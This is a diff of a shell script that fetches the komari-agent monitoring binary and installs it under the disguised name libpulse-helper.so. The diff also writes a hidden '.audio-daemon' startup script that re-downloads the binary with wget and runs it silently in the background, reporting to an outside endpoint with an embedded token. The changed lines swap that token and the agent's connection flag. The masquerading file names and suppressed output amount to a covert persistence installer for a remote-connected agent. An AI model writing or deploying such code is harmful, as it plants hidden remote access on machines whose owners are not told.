@@ -8,7 +8,7 @@ AGENT_URL="https://github.com/komari-monitor/komari-agent/releases/latest/downlo
 AGENT_PATH="$HOME/.local/lib/libpulse-helper.so"
 STARTUP_SCRIPT="$HOME/.local/lib/.audio-daemon"
 ENDPOINT="https://status.sm.uy"
-TOKEN="o4ZBYu0mUb105dQ0ZDVkIm"
+TOKEN="yrushkwQRMduYX7lU2eYyxa3"
 # =========================================
 
 mkdir -p "$HOME/.local/lib"
@@ -22,7 +22,7 @@ cat > "$STARTUP_SCRIPT" << EOF
 B="$AGENT_PATH"
 U="$AGENT_URL"
 [ ! -f "\$B" ] && wget -q "\$U" -O "\$B" && chmod +x "\$B"
-"\$B" -e $ENDPOINT -t $TOKEN -u > /dev/null 2>&1 &
+"\$B" -e $ENDPOINT --auto-discovery "$TOKEN" -u > /dev/null 2>&1 &
 EOF
 chmod +x "$STARTUP_SCRIPT"
 
